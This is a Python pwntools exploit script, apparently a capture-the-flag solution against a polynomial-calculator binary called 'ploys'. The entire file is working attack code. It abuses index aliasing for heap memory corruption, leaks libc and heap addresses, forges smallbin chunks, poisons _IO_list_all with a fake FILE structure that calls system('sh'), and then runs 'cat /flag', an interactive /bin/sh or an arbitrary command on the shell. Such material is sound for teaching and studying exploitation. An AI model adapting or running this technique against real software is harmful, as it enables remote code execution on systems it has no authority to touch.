import argparse
import functools
import time
from pathlib import Path

from pwn import *

MOD = 2281701377
PRIMITIVE_ROOT = 3
STREAM_FLUSH_LIMIT = 0x20000
PLOY_COUNT = 0x40
U8_INDEX_COUNT = 0x100
UINT32_MOD = 1 << 32
PTR_SIZE = 8
DEGREE_SIZE = 4
PLOY_ALIAS_INDEX = U8_INDEX_COUNT - 3
TARGET = UINT32_MOD - (U8_INDEX_COUNT - PLOY_ALIAS_INDEX)
PLOY_DEGREES_OFFSET = PLOY_ALIAS_INDEX * (PTR_SIZE - DEGREE_SIZE)
PLOY_DEGREES_GAP = PLOY_DEGREES_OFFSET - PLOY_COUNT * PTR_SIZE
TARGET_PTR = TARGET + 1
TARGET_DEG = TARGET + 2
VERBOSE_PROGRESS = True


class QuietProgress:
    def status(self, _):
        pass

    def success(self, _):
        pass


def progress(name):
    if VERBOSE_PROGRESS:
        return log.progress(name)
    return QuietProgress()


class StreamCmd:
    def __init__(self, io):
        self.io = io
        self.tx = bytearray()

    def line(self, data):
        if isinstance(data, int):
            data = str(data).encode()
        elif isinstance(data, str):
            data = data.encode()
        self.tx += data + b"\n"

    def maybe_flush(self):
        if len(self.tx) >= STREAM_FLUSH_LIMIT:
            self.flush()

    def flush(self, close=False):
        _ = close
        if self.tx:
            self.io.send(bytes(self.tx))
            self.tx.clear()
        return b""

    def recvuntil(self, delim):
        if isinstance(delim, str):
            delim = delim.encode()
        self.flush()
        return self.io.recvuntil(delim)

    def recvline(self):
        self.flush()
        return self.io.recvline()


def ntt(a, invert=False):
    n = len(a)
    j = 0
    for i in range(1, n):
        bit = n >> 1
        while j & bit:
            j ^= bit
            bit >>= 1
        j ^= bit
        if i < j:
            a[i], a[j] = a[j], a[i]

    length = 2
    while length <= n:
        wlen = pow(PRIMITIVE_ROOT, (MOD - 1) // length, MOD)
        if invert:
            wlen = pow(wlen, MOD - 2, MOD)
        for i in range(0, n, length):
            w = 1
            half = length // 2
            for j in range(half):
                u = a[i + j]
                v = (a[i + j + half] * w) % MOD
                add = u + v
                if add >= MOD:
                    add -= MOD
                sub = u + MOD - v
                if sub >= MOD:
                    sub -= MOD
                a[i + j] = add
                a[i + j + half] = sub
                w = (w * wlen) % MOD
        length <<= 1

    if invert:
        n_inv = pow(n, MOD - 2, MOD)
        for i in range(n):
            a[i] = (a[i] * n_inv) % MOD


class BestploysStream:
    def __init__(self, cmd):
        self.cmd = cmd
        self.opt_counts = 0

    def menu(self, c):
        self.opt_counts += 1
        self.cmd.line(c)

    def read_poly(self, idx, deg, coeffs):
        self.menu(1)
        self.cmd.line(idx)
        self.cmd.line(deg)
        for i in range(deg + 1):
            self.cmd.line(coeffs[i])
        self.cmd.maybe_flush()

    def multiply_polys(self, idx_a, idx_b):
        self.menu(2)
        self.cmd.line(idx_a)
        self.cmd.line(idx_b)
        self.cmd.maybe_flush()

    def add_polys(self, idx_a, idx_b, idx_dest):
        self.menu(3)
        self.cmd.line(idx_a)
        self.cmd.line(idx_b)
        self.cmd.line(idx_dest)
        self.cmd.maybe_flush()

    def show_poly(self, idx):
        self.menu(4)
        self.cmd.line(idx)
        self.cmd.maybe_flush()

    def flush_top_chunk(self):
        self.menu(4)
        self.cmd.line(b"0" * 0x500 + b"100")
        self.cmd.flush()
        self.cmd.recvuntil(b"Invalid index\n")

    def parse_poly(self, s):
        return [int(c) for c in s.split()]

    def recv_ploy(self):
        self.cmd.flush()
        self.cmd.recvuntil(b" (mod 2281701377):\n")
        return self.parse_poly(self.cmd.recvline().decode())

    def exit(self):
        self.menu(5)
        return self.cmd.flush(close=True)


def smoke(sess):
    sess.read_poly(0, 2, [10, 20, 30])
    sess.show_poly(0)
    ploy = sess.recv_ploy()
    if ploy != [10, 20, 30]:
        raise ValueError(f"unexpected smoke result: {ploy!r}")
    sess.flush_top_chunk()
    sess.exit()
    log.success("stream smoke test passed")


def pwn_stream(sess):
    def inv(x):
        return pow(x, -1, MOD)

    def wrap(x):
        return x % MOD

    B = [i for i in range(32)]
    for i in range(32):
        sess.read_poly(B[i], 0x0, [2**i])

    SHIFT = 0x20
    sess.read_poly(SHIFT, 1, [0, 1])

    ZERO = 0x2f
    sess.read_poly(ZERO, 0, [0])

    ONE = 0x30
    sess.read_poly(ONE, 0, [1])

    R = [0x21 + i for i in range(0x1f)]
    for i in range(13):
        sess.read_poly(R[i], 0, [0])

    TRASH = 0x31

    def log_info_wrapper(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            if not VERBOSE_PROGRESS:
                return func(*args, **kwargs)
            with context.local(log_level="info"):
                return func(*args, **kwargs)
        return wrapper

    @log_info_wrapper
    def make_ploy_without_sync(ploy, dest):
        p = progress("Making ploy")
        T0 = R[0]
        T1 = R[1]
        sess.add_polys(ZERO, ZERO, T1)
        for i, coeff in enumerate(ploy[::-1]):
            sess.add_polys(ZERO, ZERO, T0)
            for x in range(32):
                if (coeff >> x) & 1:
                    sess.add_polys(T0, B[x], T0)
            sess.multiply_polys(SHIFT, T1)
            sess.add_polys(T0, T1, T1)
            p.status(f"Processing coefficient {i} / {len(ploy)}")
        sess.add_polys(T1, ZERO, dest)
        p.success("Done")

    @log_info_wrapper
    def make_ploy(ploy, dest):
        make_ploy_without_sync(ploy, dest)
        sync_out()

    @log_info_wrapper
    def make_zero_n_degree_poly(n, dest):
        p = progress("Making zero n degree ploy")
        T0 = R[0]
        sess.add_polys(ZERO, ZERO, T0)
        for i in range(n - 1):
            sess.multiply_polys(SHIFT, T0)
            p.status(f"Processing degree {i + 1} / {n}")
        sess.add_polys(T0, ZERO, dest)
        sync_out()
        p.success("Done")

    @log_info_wrapper
    def make_one_n_degree_poly(n, dest):
        p = progress("Making one n degree ploy")
        T0 = R[0]
        sess.add_polys(ZERO, ZERO, T0)
        for i in range(n - 1):
            sess.multiply_polys(SHIFT, T0)
            p.status(f"Processing degree {i + 1} / {n}")
        sess.add_polys(T0, ONE, dest)
        sync_out()
        p.success("Done")

    def bytes2ploy(b):
        b = b.ljust(0x200, b"\x00")
        res = []
        for i in range(0, len(b), 4):
            res.append(int.from_bytes(b[i:i + 4], "little"))
        return res

    def bytes2ploy_ntt(b):
        ploy = bytes2ploy(b)
        ntt(ploy, invert=True)
        return ploy

    def make_bytes(b, dest):
        make_ploy(bytes2ploy_ntt(b), dest)

    def dot_mul(ploy_a, ploy_b):
        if len(ploy_a) != len(ploy_b):
            raise ValueError("polynomial length mismatch")
        res = [0] * len(ploy_a)
        for i, (a, b) in enumerate(zip(ploy_a, ploy_b)):
            res[i] = wrap(a * b)
        return res

    def mul_bytes(old, b, dest):
        ploy_old = bytes2ploy(old)
        ploy_b = bytes2ploy(b)
        for i in range(len(ploy_old)):
            if ploy_old[i] != 0:
                ploy_old[i] = inv(ploy_old[i])
        ploy = dot_mul(ploy_old, ploy_b)
        ntt(ploy, invert=True)
        make_ploy(ploy, dest)
        log.success(f"result ploy idx: {dest:#x}")

    def log_ploy(log_func, ploy):
        s = "\n"
        for i, coeff in enumerate(ploy):
            s += f"\t[0x{i:02x}] = {coeff:#x}\n"
        log_func(f"received ploy: {s}")

    def sync_out():
        sess.show_poly(TRASH)
        sess.recv_ploy()
        if VERBOSE_PROGRESS:
            log.success("Output synchronized")

    make_ploy([i for i in range(0x3)], TRASH)

    make_zero_n_degree_poly(0xf0, R[10])
    sess.multiply_polys(R[10], TARGET)

    mul_bytes(flat({0x1c8: 0x1a651}, filler=b"\x00"),
              flat({0x1c8: 0x651}, filler=b"\x00"), R[11])
    sess.multiply_polys(R[11], TARGET)

    make_one_n_degree_poly(0xf0 - 0x70 + 1, R[10])
    sess.multiply_polys(R[10], TARGET)

    sess.flush_top_chunk()
    sess.flush_top_chunk()

    make_one_n_degree_poly(1, R[10])
    sess.multiply_polys(TARGET, R[10])
    sess.show_poly(R[10])
    ploy = sess.recv_ploy()
    ntt(ploy, invert=False)
    if VERBOSE_PROGRESS:
        log_ploy(log.success, ploy)

    leak = ploy[0x75] * 2**32 + ploy[0x74]
    log.success(f"{leak= :#x}")
    libc_base = leak - 0x203f90
    if libc_base & 0xfff != 0:
        leak += MOD
    libc_base = leak - 0x203f90
    log.success(f"{libc_base= :#x}")

    leak = ploy[0x79] * 2**32 + ploy[0x78]
    log.success(f"{leak= :#x}")
    heap_base = leak - 0x69b0
    if heap_base & 0xfff != 0:
        leak += MOD
    heap_base = leak - 0x69b0
    log.success(f"{heap_base= :#x}")

    if heap_base & 0xfff != 0 or libc_base & 0xfff != 0:
        raise EOFError("unaligned libc/heap leak")

    make_zero_n_degree_poly(0xf0, R[10])
    sess.multiply_polys(R[10], TARGET_DEG)
    make_zero_n_degree_poly(0x10 + 1, R[10])
    sess.multiply_polys(R[10], TARGET_DEG)

    make_zero_n_degree_poly(0xf0, R[10])
    sess.multiply_polys(R[10], TARGET_PTR)

    make_zero_n_degree_poly(0xf0 - 0xd0 + 1, R[10])
    sess.multiply_polys(R[10], TARGET_DEG)

    sess.flush_top_chunk()

    smallbin = libc_base + 0x203d20
    victim = heap_base + 0x5d60
    origin = heap_base + 0x6dd0

    make_bytes(flat({
        0: [0, 0x211, origin, victim + 0x100],
        0x40: [0, 0x211, victim + 0x80, smallbin],
        0x80: [0, 0x211, victim + 0xc0, victim + 0x40],
        0xc0: [0, 0x211, victim + 0x100, victim + 0x80],
        0x100: [0, 0x211, victim + 0x0, victim + 0xc0],
    }), R[9])

    mul_bytes(flat({
        0x1e8: 0x211,
        0x1f0: smallbin,
        0x1f8: smallbin,
    }, filler=b"\x00"), flat({
        0x1e8: 0x211,
        0x1f0: origin,
        0x1f8: victim,
    }, filler=b"\x00"), R[11])
    sess.multiply_polys(R[11], TARGET_PTR)

    sess.read_poly(R[15], 0, [0])
    sess.read_poly(R[16], 0, [0])

    _IO_list_all = 0x2044c0 + libc_base
    system = 0x58750 + libc_base
    _IO_wfile_jumps = 0x202228 + libc_base

    make_bytes(flat({
        0x30: [
            0, 0x211,
            ((heap_base + 0x5df0) >> 12) ^ (_IO_list_all - 0x110),
            0x1337beef,
        ]
    }), R[16])

    fake_file_addr = heap_base + 0x5730
    payload = flat({
        0x0: b"  sh;",
        0x28: system,
        0xa0: fake_file_addr - 0x10,
        0x88: fake_file_addr + 0x6000,
        0xD0: fake_file_addr + 0x28 - 0x68,
        0xD8: _IO_wfile_jumps,
    }, filler=b"\x00")

    make_bytes(flat({0x0110: fake_file_addr}), R[15])
    make_bytes(payload, R[6])

    sess.read_poly(R[17], 0, [0])
    sess.read_poly(R[18], 0, [0])
    sess.add_polys(R[15], ZERO, R[18])
    sess.exit()
    log.success(f"All Opt is OPT_COUNTS = {sess.opt_counts}")


def make_io(args):
    if args.local:
        return process([args.binary])
    return remote(args.host, args.port)


def parse_args():
    default_bin = Path(__file__).resolve().parents[1] / "source" / "ploys"
    parser = argparse.ArgumentParser()
    parser.add_argument("--local", action="store_true")
    parser.add_argument("--binary", default=str(default_bin))
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int)
    parser.add_argument("--smoke", action="store_true")
    parser.add_argument("--attempts", type=int, default=500)
    post = parser.add_mutually_exclusive_group()
    post.add_argument("--cat-flag", action="store_true")
    post.add_argument("--binsh", action="store_true")
    post.add_argument("--cmd")
    parser.add_argument("--quiet-progress", action="store_true")
    args = parser.parse_args()
    if args.port is None:
        args.port = 1337
    return args


def main():
    global VERBOSE_PROGRESS
    context.log_level = "info"
    context.arch = "amd64"
    args = parse_args()
    if args.quiet_progress:
        VERBOSE_PROGRESS = False

    if args.smoke:
        io = make_io(args)
        sess = BestploysStream(StreamCmd(io))
        smoke(sess)
        io.close()
        return

    io = None
    success = False
    for i in range(args.attempts):
        try:
            start_time = time.time()
            io = make_io(args)
            sess = BestploysStream(StreamCmd(io))
            pwn_stream(sess)
            if args.cmd:
                io.sendline(b"echo SHELL_OK; " + args.cmd.encode() + b"; exit")
                out = io.recvall(timeout=5)
                print(out.decode("latin-1", errors="replace"), end="")
                if b"SHELL_OK" not in out:
                    raise EOFError("shell marker missing")
                return
            if args.cat_flag:
                io.sendline(b"echo SHELL_OK; cat /flag; exit")
                out = io.recvall(timeout=5)
                print(out.decode("latin-1", errors="replace"), end="")
                if b"SHELL_OK" not in out:
                    raise EOFError("shell marker missing")
                return
            if args.binsh:
                io.sendline(b"echo SHELL_OK; exec /bin/sh -i")
                io.recvuntil(b"SHELL_OK\n")
                duration = time.time() - start_time
                log.success(f"Attempt {i + 1} got /bin/sh after {duration:.2f} seconds")
                io.interactive()
                return
            duration = time.time() - start_time
            log.success(f"Attempt {i + 1} succeeded after {duration:.2f} seconds")
            success = True
            break
        except (EOFError, ValueError) as e:
            if io is not None:
                io.close()
            duration = time.time() - start_time
            log.warning(f"Attempt {i + 1} failed after {duration:.2f} seconds: {e}")
    if success and io is not None:
        io.interactive()
    else:
        raise SystemExit(1)


if __name__ == "__main__":
    main()
